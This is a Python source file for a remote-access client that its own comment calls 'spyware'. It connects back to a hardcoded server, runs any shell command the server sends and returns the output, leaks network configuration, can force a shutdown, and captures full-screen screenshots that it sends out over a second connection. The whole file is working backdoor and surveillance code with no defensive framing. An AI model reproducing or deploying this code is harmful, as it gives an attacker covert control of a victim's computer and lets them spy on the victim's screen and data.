import socket
import time
import os
import subprocess
try:
    import PIL
    from PIL import ImageGrab
    from PIL import Image
    pilacticve = True
except:
    pilacticve = False
print("PIL status:",pilacticve)
#establishing standards:
#b'_' acknowledgement
#b'&end' signifys finnishing a transmition
class terminal:
    def __init__(self) -> None:
        pass
    def run_command(self,command):
        command = command.split(" ")
        print("executing commmand:",command)
        try:
            result = subprocess.run(command, stdout=subprocess.PIPE).stdout.decode()
        except Exception as problem:
            result = str(problem)
            print(result)
        return result
class remote_connection: #hopefully this class should provide neatly packaged functions to be shipped to the actual main spyware body
    def __init__(self,pilactive) -> None: #pilactive is true if pil is installed
        self.server = socket.socket()
        self.connect()
    def connect(self):
        while True:
            try:
                self.server.connect(("192.168.1.141",8017))
                break
            except:
                print("connection not available, failed to connect")
        self.handshake(["connected",pilacticve])
    def shutdown_socket(self):
        self.server.shutdown(socket.SHUT_RDWR)
        self.server.close()
    def handshake(self,buffer):
        try:
            receive_buffer = []
            self.server.recv(1024)
            self.server.sendall(b"_")
            while True:
                recv = self.server.recv(1024)
                if recv == b"&end":
                    break
                self.server.sendall(b"_")
                receive_buffer.append(recv.decode())
            self.server.sendall(b"_")
            self.server.recv(1024)
            for i in buffer:
                self.server.sendall(str(i).encode())
                self.server.recv(1024)
            self.server.sendall(b"&end")
            return receive_buffer
        except Exception as problem:
            print(problem)
            self.shutdown_socket()
            self.__init__(pilactive=pilacticve)
socket_handler = remote_connection(pilacticve)
terminal = terminal()
incoming_buffer = []
outgoing_buffer = []
while True:
    try:
        new_incoming_buffer = socket_handler.handshake(outgoing_buffer)
        outgoing_buffer = []
        for i in new_incoming_buffer:
            incoming_buffer.append(i)
        counter = 0
        for i in incoming_buffer:
            del(incoming_buffer)[counter]
            match i.split(",")[0]:
                case "shutdown":
                    print("shutting down")
                    terminal.run_command("shutdown /f")
                case "ip address":
                    print("getting ip address")
                    for i in terminal.run_command("ipconfig").split("\n"):
                        outgoing_buffer.append(i)
                case "command":
                    command = i.split(",")[1]
                    for i in terminal.run_command(command).split("\n"):
                        outgoing_buffer.append(i)
                case "screen capture":
                    image = ImageGrab.grab(all_screens=True)
                    image.save("screenshot.png")
                    image_contents = []
                    with open("screenshot.png","rb") as doc:
                        for i in doc:
                            image_contents.append(i)
                    outgoing_buffer.append("incoming image")    
                    temp_server = socket.socket()
                    while True:
                        try:
                            temp_server.connect(("192.168.1.141",8018))
                            break
                        except:
                            print("file transfer socket error")
                    temp_server.sendall(b"remote screenshot.png")
                    temp_server.recv(1024)
                    for i in image_contents:
                        temp_server.sendall(i)
                        temp_server.recv(1024)
                    temp_server.sendall(b"&end")
                    temp_server.shutdown(socket.SHUT_RDWR)
                    temp_server.close()
                    os.remove("screenshot.png")
                    print("screenshot sucsessfully sent")
            if outgoing_buffer[-1] == "":
                del(outgoing_buffer)[-1]
            counter += 1        
    except Exception as problem:
        print(problem)